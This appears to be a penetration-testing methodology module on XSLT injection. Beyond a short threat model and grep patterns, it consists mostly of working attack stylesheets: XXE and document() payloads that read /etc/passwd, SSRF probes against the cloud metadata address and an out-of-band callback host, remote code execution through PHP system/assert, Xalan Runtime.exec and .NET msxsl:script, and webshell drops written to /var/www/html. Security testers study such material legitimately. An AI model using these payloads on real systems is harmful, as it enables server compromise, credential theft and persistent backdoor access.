# VULN MODULE — XSLT Injection
# Asset: webapp
# CWE-91 | Report prefix: WEB-XSLT

## THREAT MODEL

XSLT (Extensible Stylesheet Language Transformations) injection occurs when
user-controlled input influences an XSL transformation. Impact depends on
the XSLT processor and version: file read, SSRF, and RCE are all achievable.

Attack surface:
- XML transformation endpoints (document conversion, data export)
- XSLT stylesheet upload / customization features
- XML-to-HTML/PDF conversion services
- Any API accepting XML with a stylesheet parameter

## VULNERABILITY CLASSES

1. XXE via DOCTYPE in XSLT         CWE-611 — entity injection into stylesheet
2. SSRF via document()             CWE-918 — external document fetch
3. LFR via document()              CWE-22  — local file read
4. RCE via extension functions     CWE-78  — PHP/Java/.NET native function calls
5. File Write via exsl:document    CWE-73  — write arbitrary files to disk

## WHITEBOX PATTERNS

```bash
# XSLT processing libraries
grep -rn "XslCompiledTransform\|XsltTransform\|XSLTProcessor\|xsltproc\|Xalan\|Saxon\|libxslt" \
  --include="*.cs" --include="*.java" --include="*.php" --include="*.py" --include="*.rb"

# User-controlled stylesheet
grep -rn "stylesheet\|xslt\|xsl" \
  --include="*.php" --include="*.java" --include="*.cs" -A5 | \
  grep -i "param\|input\|request\|upload"

# PHP xsl extension
grep -rn "XSLTProcessor\|xsl_xsltprocess\|xslt_process" --include="*.php"

# Java
grep -rn "TransformerFactory\|newTransformer\|StreamSource" --include="*.java" -A5
```

## VENDOR FINGERPRINTING

Inject a version-revealing expression into a controllable field:

```xml
<!-- Probe stylesheet (inject via parameter or upload): -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes"/>
  <xsl:template match="/">
    <!-- System properties reveal vendor -->
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:value-of select="system-property('xsl:version')"/>
  </xsl:template>
</xsl:stylesheet>
```

| Output | Processor |
|---|---|
| `SAXON 9.x` | Saxon (Java) |
| `Apache Software Foundation` | Xalan (Java) |
| `Microsoft` | .NET XslCompiledTransform |
| `libxslt` | libxslt (PHP/Python/Ruby) |
| `Transformiix` | Firefox built-in |

## XXE VIA DOCTYPE IN XSLT

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>&xxe;</output>
  </xsl:template>
</xsl:stylesheet>
```

## FILE READ / SSRF VIA document()

```xml
<!-- Local file read -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- SSRF — internal service probe -->
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>

<!-- SSRF — blind via DNS (confirm with Burp Collaborator / interactsh) -->
<xsl:copy-of select="document('http://UNIQUE.burpcollaborator.net/')"/>
```

## RCE PAYLOADS

### PHP (libxslt + php:function extension)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <!-- system() — command output inline -->
    <xsl:value-of select="php:function('system', 'id')"/>

    <!-- readfile() — read arbitrary file -->
    <xsl:value-of select="php:function('readfile', '/etc/passwd')"/>

    <!-- scandir() — list directory -->
    <xsl:value-of select="php:function('scandir', '/')"/>

    <!-- assert() — execute PHP code string -->
    <xsl:value-of select="php:function('assert', 'system(\"id\")')"/>

    <!-- preg_replace with /e modifier (PHP < 5.5) -->
    <xsl:value-of select="php:function('preg_replace', '/.*/e', 'system(\"id\")', '')"/>

    <!-- file_put_contents — write webshell -->
    <xsl:value-of select="php:function('file_put_contents',
      '/var/www/html/shell.php',
      '&lt;?php system($_GET[cmd]); ?&gt;')"/>
  </xsl:template>
</xsl:stylesheet>
```

### Java — Xalan (xalan:evaluate extension)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj, 'id')"/>
    <xsl:value-of select="ob:toString($process)"/>
  </xsl:template>
</xsl:stylesheet>
```

### Java — Saxon (saxon:call-template or IIOP)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:saxon="http://saxon.sf.net/"
  extension-element-prefixes="saxon">
  <xsl:template match="/">
    <xsl:value-of select="saxon:system-id()"/>
    <!-- For RCE combine with xxe / entity injection -->
  </xsl:template>
</xsl:stylesheet>
```

### .NET — msxsl:script (C# execution)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:my-scripts">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
      public string exec(string cmd) {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        return p.StandardOutput.ReadToEnd();
      }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec('whoami')"/>
  </xsl:template>
</xsl:stylesheet>
```

## FILE WRITE VIA exsl:document

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/html/shell.php" method="text">
      <xsl:text>&lt;?php system($_GET['cmd']); ?&gt;</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

## TOOLS

```bash
# Manual testing with xsltproc (local validation):
xsltproc payload.xsl input.xml

# Burp Suite — intercept XSLT/XML endpoint, inject stylesheet parameter
# Look for: ?xsl=, ?stylesheet=, ?template=, Content-Type: application/xml
```
